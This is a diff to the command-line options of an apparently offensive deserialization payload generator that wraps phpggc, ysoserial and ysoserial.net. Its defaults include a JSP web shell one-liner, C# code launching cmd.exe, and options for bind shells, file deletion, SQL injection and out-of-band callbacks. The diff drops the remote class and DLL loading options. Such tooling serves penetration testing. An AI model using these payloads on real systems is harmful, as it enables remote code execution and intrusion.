@@ -77,6 +77,7 @@ if __name__ == '__main__':
     common_group.add_argument('-s', '--serializer', help="Serializer or language", choices=available_serializers + available_languages + ['all'], default='phpggc')
     common_group.add_argument('-f', '--unsafe', help="Unsafe gadget chains like File Delete", action="store_true")    
     common_group.add_argument('-n', '--no-color', help='No colored output', action="store_true")
+    common_group.add_argument('-nc', '--no-cache', help='Do not use cache of list of chains', action="store_true")
     common_group.add_argument('-v', '--verbose', help="Verbose mode", action="store_true")    
     common_group.add_argument('-o1', '--one-file-per-payload', help="Create one file per payload. Base directory of --output will be taken for that", action="store_true") 
 
@@ -85,7 +86,7 @@ if __name__ == '__main__':
     payload_group.add_argument('-i', '--interact-domain', help="Domain for listening to outband DNS, HTTP callbacks: collaborator, interactsh...")
     payload_group.add_argument('-rc', '--remote-content', help="Remote content to write in 'File Write' type chains, defaults to jsp-code, php-code, python-code values")
     payload_group.add_argument('-rp', '--remote-port', help="Remote port that will be opened on remote server for bind shell chains", default='54321')
-    payload_group.add_argument('-rr', '--remote-file-to-read', help="File path locally read on remote server for 'File Read' type chains.", default='index.php')
+    payload_group.add_argument('-rr', '--remote-file-to-read', help="File path locally read on remote server for 'File Read' type chains: default is C:\\WINDOWS\\System32\\drivers\\etc\\hosts for c# and /etc/hosts for others")
     payload_group.add_argument('-rw', '--remote-file-to-write', help="File path written locally on remote server for 'File Write' type chains, where %%ext%% is php, jsp, py depending on the gadget chain", default='./blackserial.%%ext%%')
     payload_group.add_argument('-rd', '--remote-file-to-delete', help="File path locally on remote server that will be delete if unsafe is enabled for 'File Delete' type chains.", default='index.php')
     payload_group.add_argument('-sq', '--sql', help="SQL query to trigger in 'SQL Injection' chains", default='SELECT SLEEP(15)')
@@ -109,8 +110,6 @@ if __name__ == '__main__':
     ysoserial_group.add_argument('--java-path', help="Full path to java bin", default="./bin/jre1.8.0_431/bin/java")
     ysoserial_group.add_argument('--ysoserial-path', help="Full path to ysoserial jar", default="./bin/ysoserial-all.jar")
     ysoserial_group.add_argument('--jsp-code', help="JSP Code or path to a file used for 'File Write' type chains (ex: exploit.jsp)", default="<% Runtime.getRuntime().exec(request.getParameter(\"c\")) %> %%chain_id%%")
-    ysoserial_group.add_argument('--java-remote-class-url', help="URL of the webserver serving a java class for remote dynamic loading. Use it with --java-classname", default="https://%%domain%%/%%chain_id%%")
-    ysoserial_group.add_argument('--java-classname', help="Java class name used for remote dynamic loading", default="Main")
 
     # python specific
     pickle_group = parser.add_argument_group('pickle')
@@ -120,7 +119,6 @@ if __name__ == '__main__':
     net_group = parser.add_argument_group('ysoserial.net')
     net_group.add_argument('--csharp-code', help="C# Code or path to a file containing the C# code (ex: exploit.cs).", default="using System.Diagnostics;public class Exploit{public Exploit(){System.Diagnostics.Process.Start(\"cmd.exe\",\"/c %%system_command%%\");}}")
     net_group.add_argument('--csharp-code-dlls', help="Semicolon list of DLLs dependencies to compile C# code", default="System.dll")
-    net_group.add_argument('--csharp-remote-dll', help="URL or SMB path to make the chain load remotely a DLL and execute it", default="https://%%domain%%/%%chain_id%%.dll")
     net_group.add_argument('--csharp-net-remoting', help="URL .Net remoting proxy, transports tcp, http, ipc are supported (https://github.com/codewhitesec/RogueRemotingServer>)", default="http://%%domain%%/%%chain_id%%")
     net_group.add_argument('--ysoserial-net-formatters', help="Only use this list of YSOSerial.net formatters, comma-separated")
     net_group.add_argument('--ysoserial-net-path', help="Full path to YSOSerial.net exe", default="./bin/Release/ysoserial.exe")
